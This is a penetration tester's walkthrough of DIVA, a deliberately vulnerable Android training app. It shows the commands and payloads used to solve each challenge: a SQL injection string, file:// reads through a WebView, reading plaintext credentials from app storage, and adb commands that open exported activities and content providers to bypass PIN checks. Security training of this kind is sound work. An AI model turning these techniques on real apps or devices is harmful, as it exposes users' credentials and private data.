DIVA - Damn Insecure and Vulnerable App

May 3, 2026 · 10 min read
Wesam Abdelaziz
Penetration Tester

DIVA is an intentionally vulnerable Android app covering 5 categories: Insecure Logging, Hardcoding Issues, Input Validation Issues, Insecure Data Storage, and Access Control.

1. Insecure Logging​

Objective​

Solution​

  • After decompiling the APK using APKLab in VS Code, I analyzed the Java source code of this challenge and found that the developer used Log.e() to log errors along with the credit card number entered by the user.

  • To confirm this from a different angle, I used a second approach — I entered a credit card number directly in the app and got an error message. I then searched for that error message in the decompiled Java code and found the same vulnerable code, confirming the finding through both static and dynamic analysis.

  • Now knowing that Log.e() writes the credit card number to logcat, I needed to capture those logs. Since logcat output is very long, I first got the PID of the DIVA application to filter only its logs:

adb shell pidof jakhar.aseem.diva
# package name can be found in AndroidManifest.xml
  • Then I filtered logcat by the app's PID: adb logcat --pid=4423
  • The credit card number appeared in the logs, confirming the insecure logging vulnerability.

2. Hardcoding Issues - Part 1​

Objective​

Solution​

  • I directly analyzed the Java source code of this challenge:
public void access(View view) {
    EditText hckey = (EditText) findViewById(R.id.hcKey);
    if (hckey.getText().toString().equals("vendorsecretkey")) {
        Toast.makeText(this, "Access granted! See you on the other side :)", 0).show();
    } else {
        Toast.makeText(this, "Access denied! See you in hell :D", 0).show();
    }
}
  • This function takes the user input from the text field hcKey and compares it directly against the hardcoded string "vendorsecretkey". If it matches → Access granted, otherwise → Access denied.
  • The secret key vendorsecretkey is hardcoded directly in the source code — meaning anyone who decompiles the APK using JADX can extract it instantly without any reverse engineering effort.
  • I entered the extracted key directly in the app and got access granted.

2. Hardcoding Issues - Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I found the access() function which takes user input and passes it to this.djni.access() for validation:
public void access(View view) {
    EditText hckey = (EditText) findViewById(R.id.hc2Key);
    if (this.djni.access(hckey.getText().toString()) != 0) {
        Toast.makeText(this, "Access granted!", 0).show();
    } else {
        Toast.makeText(this, "Access denied!", 0).show();
    }
}

  • The function takes user input from hc2Key, passes it to this.djni.access() for validation. If the function returns anything other than 0 → Access granted, if it returns 0 → Access denied.

  • I then traced djni to the DivaJni class and found that the actual validation logic is a native method implemented in a compiled C/C++ library libdivajni.so:

public class DivaJni {
    private static final String soName = "divajni";

    // declared as native — implementation is inside libdivajni.so
    public native int access(String str);

    static {
        System.loadLibrary(soName); // loads libdivajni.so at runtime
    }
}
  • Since the logic is inside a compiled binary that JADX can't read, I extracted the .so file from the APK and used the strings command to extract any readable text embedded in the binary:
strings lib/x86/libdivajni.so
  • Among the output, I spotted a suspicious random string: olsdfgad;lh
  • I entered it as the key in the app and got access granted, confirming it was the hardcoded secret key hidden inside the native library.
  • OR using Ghidra for reversing.

3. Input Validation Issues - Part 1​

Objective​

Solution​

  • After analyzing the Java source code, I spotted the vulnerability — the app inserts user input directly into a SQL query without any sanitization.
  • The query directly concatenates user input into the SQL statement, making it vulnerable to SQL injection.
  • I used the following payload to retrieve all users data: ' OR 1=1--
    • This closes the original query with ', adds OR 1=1 which is always true returning all rows, then -- comments out the rest of the query.
  • The final query executed becomes: SELECT * FROM sqliuser WHERE user = '' OR 1=1--'
  • All users data was returned including usernames, passwords and credit card numbers.

Input Validation Issues - Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I spotted two problems:
// Problem 1 — JavaScript is enabled
wset.setJavaScriptEnabled(true);

// Problem 2 — User input is loaded directly into WebView without any validation
wview.loadUrl(uriText.getText().toString());

  • Problem 1 — JavaScript Enabled: Enabling JavaScript inside a WebView allows execution of JS code, making the app vulnerable to XSS attacks.

  • Problem 2 — No URI Schema Validation: The app passes user input directly to loadUrl() without restricting which schemas are allowed. This means the WebView accepts any schema including:

    • https:// → load any website
    • file:/// → access local files on the device
    • javascript: → execute JS code

  • I exploited the file:// schema to read internal files directly: file:///etc/hosts

  • We can also access the app's SharedPreferences file: file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml

4. Insecure Data Storage - Part 1​

Objective​

Solution​

  • First I entered the username and password and got a success message confirming the credentials were saved.

  • Now lets view the code of this challenge

  • The function creates an instance of SharedPreferences — an XML file used to store data within the app in the form of key-value pairs — then saves the username and password directly into it without any encryption.

  • SharedPreferences files are always located in the app's private folder: /data/data/jakhar.aseem.diva/shared_prefs

  • I listed the contents of this directory — note that a rooted device is required:

ls /data/data/jakhar.aseem.diva/shared_prefs

# Output
WebViewChromiumPrefs.xml
jakhar.aseem.diva_preferences.xml
  • I read the file contents:
cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
  • The file exposed the credentials stored in plaintext:
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">testtt</string>
    <string name="user">wesam</string>
</map>

  • I analyzed the Java source code and found that the app uses a SQLite database called ids2 to store user credentials: this.mDB = openOrCreateDatabase("ids2", 0, null);

  • SQLite databases are located at: /data/data/jakhar.aseem.diva/databases

ls /data/data/jakhar.aseem.diva/databases

sqlite> .tables

  • All user credentials were stored in plaintext inside the database.

Objective​

5. Access Control - Part 1​

Objective​

Access the API credentials from outside the app without using the app's interface directly.

Solution​

Step 1 — Source Code Analysis

  • I decompiled the APK using JADX and analyzed AccessControl1Activity.java. I found a button that triggers the viewAPICredentials function which creates an Implicit Intent:
Intent i = new Intent();
i.setAction("jakhar.aseem.diva.action.VIEW_CREDS");

Step 2 — Manifest Analysis

  • I searched AndroidManifest.xml for the Activity that handles this action. I found APICredsActivity registered with an intent-filter matching the action VIEW_CREDS. Since it has an intent-filter, Android automatically marks it as Exported:
<activity android:label="@string/apic_label" android:name="jakhar.aseem.diva.APICredsActivity">
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>

Step 3 — Exploitation

  • Since APICredsActivity is Exported automatically, I triggered it directly using ADB:
adb shell am start -n jakhar.aseem.diva/.APICredsActivity
  • The Activity opened directly exposing the API credentials.

Part 2​

Objective​

Solution​

  • After analyzing the Java source code, I found that APICreds2Activity checks a boolean parameter called check_pin from the incoming Intent:
boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);
if (!bcheck) {
    apicview.setText("TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2");
    return;
}
  • I looked up the actual value in res/values/strings.xml:
<string name="chk_pin">check_pin</string>
tip

Always check res/values/strings.xml when you see R.string.something in code — it often reveals parameter names needed for exploitation.

  • The logic is simple:

    • check_pin = false → show API credentials directly
    • check_pin = true → ask for PIN (default behavior)

  • I then checked the Manifest and found that APICreds2Activity has an intent-filter — making it exported and accessible from outside the app without authentication:

  • Combining everything, I triggered the Activity directly via ADB passing check_pin as false to bypass PIN verification:

    adb shell am start \
    -a jakhar.aseem.diva.action.VIEW_CREDS2\
    --ez check_pin false
    • am start : start an Activity
    • -a (action flag) — specifies the Intent action
    • -ez : passes a Boolean to the intent
    • check_pin : the parameter name

  • The Activity opened directly exposing the API credentials without any PIN verification.

Part 3​

Objective​

Solution​

  • After analyzing the Java source code, I found that AccessControl3Activity requires a valid PIN before showing the notes via goToNotes():
public void goToNotes(View view) {
    Intent i = new Intent(this, (Class<?>) AccessControl3NotesActivity.class);
    startActivity(i);
}
  • Inside AccessControl3NotesActivity, the accessNotes() function validates the PIN then queries the notes from the Content Provider:
String pin = spref.getString(getString(R.string.pkey), "");
String userpin = pinTxt.getText().toString();
if (userpin.equals(pin)) {
    Cursor cr = getContentResolver().query(NotesProvider.CONTENT_URI, 
        new String[]{"_id", "title", "note"}, null, null, null);
}
tip

Content Provider is an Android component that acts as a middle layer between the app and its data. ContentResolver is the bridge used to communicate with the Content Provider.

  • I checked the Manifest and found that the Content Provider is explicitly exported:
<provider android:authorities="jakhar.aseem.diva.provider.notesprovider"
          android:enabled="true"
          android:exported="true"
          android:name="jakhar.aseem.diva.NotesProvider"/>
  • I found the full Content Provider URI in NotesProvider.java:
static final Uri CONTENT_URI = Uri.parse("content://jakhar.aseem.diva.provider.notesprovider/notes");
  • I queried the notes directly from ADB — completely bypassing the PIN verification:
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes
  • All notes were returned directly without any authentication.
